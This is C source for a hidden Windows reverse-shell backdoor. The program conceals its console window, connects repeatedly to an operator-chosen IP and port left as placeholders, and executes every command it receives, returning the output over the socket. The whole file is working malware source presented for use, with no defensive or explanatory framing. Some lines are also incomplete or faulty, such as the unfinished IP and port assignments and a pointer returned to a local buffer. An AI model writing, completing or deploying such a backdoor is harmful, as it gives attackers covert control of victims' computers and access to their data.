#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <wininet.h>
#include <windowsx.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <errno.h>
#include <direct.h>

#define bzero(p, size) (void) memset((p), 0, (size))

int sock;

const char* get_path(char command[]) {

    char my_command[1024];
    strcpy(my_command, command);
    strtok(my_command, " ");

    const char *result = strtok(NULL, " ");
    return result;

}

void Shell(){

    char buffer[1024];
    char container[1024];
    char total_response[18384];

    while(1){
        jump:

        bzero(buffer, sizeof(buffer));
        bzero(container, sizeof(container));
        bzero(total_response, sizeof(total_response));
        recv(sock, buffer, sizeof(buffer), 0);

        if(strcmp("q", buffer) == 0){
            closesocket(sock);
            WSACleanup();
            exit(0);
        }
        else if(strncmp("cd ", buffer, 3) == 0){
            const char* path = get_path(buffer);
            SetCurrentDirectory(path);
            send(sock, total_response, sizeof(total_response), 0);
        }
        else{
            FILE* fp;
            fp = _popen(buffer, "r");

            while(fgets(container, sizeof(container), fp) != NULL){
                strcat(total_response, container);
            }

            send(sock, total_response, sizeof(total_response), 0);
            fclose(fp);
        }

    }

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow){

    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);

    ShowWindow(stealth, 0);

    struct sockaddr_in ServAddr;
    unsigned short ServPort;
    char* ServIP;
    WSADATA wsaData;

    ServIP = // Your IP;
    ServPort = // Your Port;

    if (WSAStartup(MAKEWORD(2, 0), &wsaData) != 0){
        exit(1);
    }

    sock = socket(AF_INET, SOCK_STREAM, 0);

    memset(&ServAddr, 0, sizeof(ServAddr));
    ServAddr.sin_family = AF_INET;
    ServAddr.sin_addr.s_addr = inet_addr(ServIP);
    ServAddr.sin_port = htons(ServPort);


    while(connect(sock, (struct sockaddr *) &ServAddr, sizeof(ServAddr)) != 0){
        Sleep(1);
    }

    Shell();

    return 0;

}
